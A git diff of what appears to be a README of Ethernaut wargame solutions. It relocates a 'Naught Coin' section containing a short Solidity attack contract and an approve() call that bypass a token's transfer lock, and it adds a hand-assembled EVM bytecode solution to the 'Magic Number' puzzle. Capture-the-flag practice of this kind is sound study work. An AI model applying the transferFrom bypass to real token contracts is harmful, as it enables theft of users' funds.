@@ -227,32 +227,6 @@ Here is a picture that explains what data should be read :
 2a55cde6341c0d09f3497cb9a8e6492e
 
 
-## Naught Coin
-This contract locks the transfer function for 10 years. But it is possible to use the approve() and transferFrom() to transfer funds.
-
-```
-contract.approve(_spenderAddress, await contract.totalSupply())
-```
-
-```
-// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.0;
-
-interface ERC20 {
-    function allowance(address _owner, address _spender) external view returns (uint256 remaining);
-    function transferFrom(address _from, address _to, uint256 _value) external returns (bool success);
-}
-
-
-contract NaughtAttack {
-
-  function attack(address vulnCoin) public {
-      uint256 amount = ERC20(vulnCoin).allowance(msg.sender, address(this));
-      ERC20(vulnCoin).transferFrom(msg.sender, address(this), amount);
-  }
-}
-```
-
 ## Gatekeeper One
 Here, we do need to:
 - use a contract to get msg.sender != tx.origin
@@ -282,6 +256,33 @@ contract gateKeeperOneAttacker {
 
 ## Gatekeeper Two
 
+
+
+## Naught Coin
+This contract locks the transfer function for 10 years. But it is possible to use the approve() and transferFrom() to transfer funds.
+
+```
+contract.approve(_spenderAddress, await contract.totalSupply())
+```
+
+```
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface ERC20 {
+    function allowance(address _owner, address _spender) external view returns (uint256 remaining);
+    function transferFrom(address _from, address _to, uint256 _value) external returns (bool success);
+}
+
+
+contract NaughtAttack {
+
+  function attack(address vulnCoin) public {
+      uint256 amount = ERC20(vulnCoin).allowance(msg.sender, address(this));
+      ERC20(vulnCoin).transferFrom(msg.sender, address(this), amount);
+  }
+}
+```
 
 
 ## Preservation
@@ -316,6 +317,53 @@ EXPLOIT WILL BE DONE ONCE Goerli IS CHEAPER !!!
 ```
 
 ## Magic Number
+Our smart contract just needs to return the value `42`. It needs to be as small as possible.
+
+To deploy a smart contract, there are two main byte codes used:
+  - The init code: It is executed during the creation to load the runtime code, and do other things if needed. Constructor parameters are used here.
+  - The runtime code: The executed code on every contract calls.
+
+### Runtime code
+First, let's build the runtime code:
+```
+// Step1: store the value 42 in memory
+PUSH1 2A    // The value to be stored in memory (here 42)
+PUSH1 00    // The offset in memory at which the value will be stored
+MSTORE      // Store the value in memory
+
+// Step2: return the value
+PUSH1 20    // Size of 32 bytes
+PUSH1 00    // Offset in memory
+RETURN      // Return value in memory
+```
+The runtime code is: `602A60005260206000F3`, which is 10-byte long.
+
+### Init code
+Second, we have to build the init code:
+```
+// Step1: copy code in memory
+PUSH1 0A     // size of our runtime code
+PUSH1 ?     // the offset at which the runtime code is stored in current bytecode
+PUSH1 00     // the destination in memory
+CODECOPY    // Copy the code in memory
+
+// Step2: return
+PUSH1 0A     // size of our runtime code
+PUSH1 00     // Memory location that holds our runtime code
+RETURN      // return with the memory location and size of runtime code
+```
+The only variable that we need to calculate is the offset at which the runtime code is stored in bytecode.
+  - We just need to calculate the init code size:
+  - `2 + 2 + 2 + 1 + 2 + 2 + 1 = 12 = 0x0C`
+  - `PUSH1 ?` can be replaced by `PUSH1 12`
+
+The init code is: `0x600A600C600039600A6000F3`.
+
+### Final code
+`Final code = Init code | Runtime code` where `|` is concatenation.
+
+Finalcode = `0x600A600C600039600A6000F3602A60005260206000F3`.
+
 
 ## Alien Codex
 
